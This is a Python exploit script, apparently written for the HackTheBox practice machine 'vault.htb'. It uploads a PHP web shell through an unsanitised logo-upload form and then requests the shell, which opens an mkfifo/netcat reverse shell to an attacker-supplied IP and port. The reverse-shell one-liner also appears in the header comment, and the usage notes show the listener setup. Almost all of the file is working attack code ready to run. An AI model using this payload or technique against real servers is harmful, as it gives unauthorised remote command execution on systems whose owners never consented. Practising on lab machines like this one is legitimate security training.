#!/usr/bin/python3

# This script was created to automate getting a reverse shell in vault.htb machine via:
# + Upload a php shell via changelogo.php upload form (that isn't properly sanitized)
# + Spawn a reverse shell
# Author: @nightwolfx2

# Help articles:
# + Insecure fileupload: https://book.hacktricks.xyz/pentesting-web/file-upload
# + Reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x yyyy >/tmp/f

# Usage:
# On a separated terminal, start a netcat listener, example:
# $nc -l -p 9999 -v
#
# Run the exploit as follows:
#─$ python3 vault.py -t vault.htb -p 80 -a 10.10.14.2 -l 9999
#[+] Attempting to upload our shell: http://vault.htb:80/sparklays/design/changelogo.php
#[+] Success, php shell has been uploaded
#[+] Reverse shell on its way!
#
# Enjoy the reverse shell :)

import requests
import argparse

PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def upload_shell(full_target, attacker_ip, attacker_port):
        url = "http://%s/sparklays/design/changelogo.php" % full_target
        print("[+] Attempting to upload our shell: " + url)
        session = requests.session()
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://vault.htb", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryX2CNZbpIrvT0laWg", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://vault.htb/sparklays/design/changelogo.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        data = "------WebKitFormBoundaryX2CNZbpIrvT0laWg\r\nContent-Disposition: form-data; name=\"file\"; filename=\"phpshell.php5\"\r\nContent-Type: application/x-php\r\n\r\n<html><head></head><body><pre>\n<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f'); ?>\n</pre></body></html>\n\r\n------WebKitFormBoundaryX2CNZbpIrvT0laWg\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nupload file\r\n------WebKitFormBoundaryX2CNZbpIrvT0laWg--\r\n" % (attacker_ip, attacker_port)
        r = session.post(url, headers=headers, data=data)
        if "The file was uploaded successfully" in r.text:
                print("[+] Success, php shell has been uploaded")
                print("[+] Reverse shell on its way!")
                url = "http://vault.htb:80/sparklays/design/uploads/phpshell.php5"
                headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
                r = session.get(url, headers=headers)
        else:
                print("[-] Exploit failed... ")

def main():
        print("Skeleton")
if __name__ == '__main__':
        session = requests.session()
        parser = argparse.ArgumentParser()
        parser.add_argument('-t','--target', help='host/ip to target, required=True')
        parser.add_argument('-p','--port', help='target port, required=True')
        parser.add_argument('-a','--attacker', help='attacker ip, required=True')
        parser.add_argument('-l','--listen', help='attacker listening port, required=True')
        args = parser.parse_args()
        full_target = args.target+":"+args.port
        attacker_ip = args.attacker
        attacker_port = args.listen
        upload_shell(full_target, attacker_ip, attacker_port)
